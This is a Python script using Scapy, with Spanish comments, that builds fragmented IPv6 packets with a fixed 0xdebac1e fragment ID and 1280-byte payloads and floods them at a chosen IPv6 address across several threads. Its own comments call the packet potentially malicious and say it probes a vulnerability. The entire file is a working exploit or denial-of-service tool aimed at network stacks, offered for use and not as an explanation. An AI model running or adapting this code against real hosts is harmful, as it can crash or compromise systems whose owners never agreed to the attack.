from scapy.all import *
import argparse
import socket
import logging
import threading
import concurrent.futures
import time
import psutil

def parse_arguments():
    """
    Parsea los argumentos de línea de comandos.
    """
    parser = argparse.ArgumentParser(description="Script para enviar paquetes IPv6 fragmentados.")
    parser.add_argument('--iface', type=str, required=True, help='Interfaz de red a utilizar.')
    parser.add_argument('--ip_addr', type=str, required=True, help='Dirección IP de destino.')
    parser.add_argument('--num_tries', type=int, default=20, help='Número de intentos por lote.')
    parser.add_argument('--num_batches', type=int, default=20, help='Número de lotes de paquetes.')
    parser.add_argument('--verbose', action='store_true', help='Mostrar mensajes de log en la consola.')
    parser.add_argument('--test_mode', action='store_true', help='Ejecutar en modo de prueba sin enviar paquetes.')
    parser.add_argument('--threads', type=int, default=4, help='Número de hilos a utilizar.')
    parser.add_argument('--log_level', type=str, default='INFO', help='Nivel de logging (DEBUG, INFO, WARNING, ERROR).')
    return parser.parse_args()

def validate_ip(ip_addr):
    """
    Valida que la dirección IP proporcionada sea una dirección IPv6 válida.
    """
    try:
        socket.inet_pton(socket.AF_INET6, ip_addr)
        return True
    except socket.error:
        return False

def create_exploit_packet(ip_addr, i):
    """
    Crea un paquete IPv6 fragmentado para probar vulnerabilidades.

    :param ip_addr: Dirección IP de destino.
    :param i: Contador para generar un ID de fragmento único.
    :return: Paquete IPv6 fragmentado.
    """
    frag_id = 0xdebac1e + i
    # Paquete potencialmente malicioso para probar la vulnerabilidad
    exploit_packet = IPv6(dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / Raw(load='A'*1280)
    return exploit_packet

def send_packets(iface, ip_addr, num_tries, num_batches, test_mode):
    """
    Envía los paquetes IPv6 fragmentados en lotes.

    :param iface: Interfaz de red a utilizar.
    :param ip_addr: Dirección IP de destino.
    :param num_tries: Número de intentos por lote.
    :param num_batches: Número de lotes de paquetes.
    :param test_mode: Si es True, no envía los paquetes realmente.
    """
    final_ps = []
    success_count = 0
    failure_count = 0
    start_time = time.time()

    for batch in range(num_batches):
        for i in range(num_tries):
            final_ps.append(create_exploit_packet(ip_addr, i))
        
        logging.info("Enviando lote %d a %s", batch + 1, ip_addr)
        try:
            if not test_mode:
                sendpfast(final_ps, iface=iface, pps=1000)  # Enviar con alta eficiencia
            success_count += len(final_ps)
            logging.info("Lote %d enviado exitosamente.", batch + 1)
        except OSError as e:
            failure_count += len(final_ps)
            logging.error("Error relacionado con el sistema operativo en lote %d: %s", batch + 1, e)
        except Scapy_Exception as e:
            failure_count += len(final_ps)
            logging.error("Error de Scapy en lote %d: %s", batch + 1, e)
        except Exception as e:
            failure_count += len(final_ps)
            logging.error("Error inesperado en lote %d: %s", batch + 1, e)
        finally:
            final_ps.clear()  # Liberar memoria
            # Monitoreo de uso de memoria
            memory_usage = psutil.virtual_memory().percent
            logging.info("Uso de memoria: %.2f%%", memory_usage)

    end_time = time.time()
    total_time = end_time - start_time
    logging.info("Paquetes enviados exitosamente: %d", success_count)
    logging.info("Paquetes fallidos: %d", failure_count)
    logging.info("Tiempo total de ejecución: %.2f segundos", total_time)

def main():
    # Parsear argumentos
    args = parse_arguments()

    # Configurar logging
    log_level = getattr(logging, args.log_level.upper(), logging.INFO)
    logging.basicConfig(filename='packet_sender.log', level=log_level,
                        format='%(asctime)s - %(levelname)s - %(message)s')

    # Configurar logging para consola si verbose está habilitado
    if args.verbose:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(log_level)
        console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        logging.getLogger().addHandler(console_handler)

    # Validar dirección IP
    if not validate_ip(args.ip_addr):
        logging.error("Dirección IP no válida: %s", args.ip_addr)
        exit(1)

    # Validar interfaz de red
    if not args.iface in get_if_list():
        logging.error("Interfaz de red no válida: %s", args.iface)
        exit(1)

    # Validar número de intentos y lotes
    if args.num_tries <= 0 or args.num_batches <= 0:
        logging.error("El número de intentos y lotes debe ser mayor que 0.")
        exit(1)

    # Enviar paquetes en hilos separados para mejorar la eficiencia
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(send_packets, args.iface, args.ip_addr, args.num_tries, args.num_batches, args.test_mode) for _ in range(args.threads)]
        for future in concurrent.futures.as_completed(futures):
            future.result()

if __name__ == "__main__":
    main()
